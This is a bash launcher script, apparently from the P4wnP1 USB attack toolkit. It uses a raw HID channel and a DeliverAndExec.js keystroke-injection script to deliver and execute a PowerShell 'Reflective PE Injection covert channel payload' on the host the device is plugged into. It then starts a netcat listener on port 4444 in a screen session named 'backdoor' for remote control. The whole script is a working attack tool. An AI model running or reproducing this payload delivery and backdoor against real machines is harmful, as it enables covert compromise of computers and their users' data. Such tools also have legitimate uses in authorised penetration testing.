#!/bin/bash

hidraw=$(P4wnP1_cli usb get device raw)

if [ "$hidraw" = "" ]; then
        echo "[!] No raw HID device found, aborting";
        exit
fi

if [ ! -f /usr/local/P4wnP1/legacy/Stage2.ps1 ]; then
    echo "[!] Stage2.ps1 not found, Use StageGenerator.py to generate it!"
    exit
fi

echo "[*] Kill old hidstager processes..."
ps -aux | grep hidstager.py | grep -v grep | awk {'system("kill "$2)'}
echo "[*] Starting HID stager for Reflective PE Injection covert channel payload..."


python2 /usr/local/P4wnP1/legacy/hidstager.py -s -i /usr/local/P4wnP1/legacy/Stage2.ps1 -o $hidraw &
P4wnP1_cli hid run -n DeliverAndExec.js > /dev.null

if ! ps -aux | grep netcat | grep -q -v grep; then
        echo "[*] Start backdoor covert channel server and attach to screen session..."
        screen -dmS backdoor bash -c "netcat -lvp 4444"
        echo "[+] Type \"screen -d -r backdoor\" to switch to backdoor cli"
else
        echo "[!] HID covert channel server already running"
fi
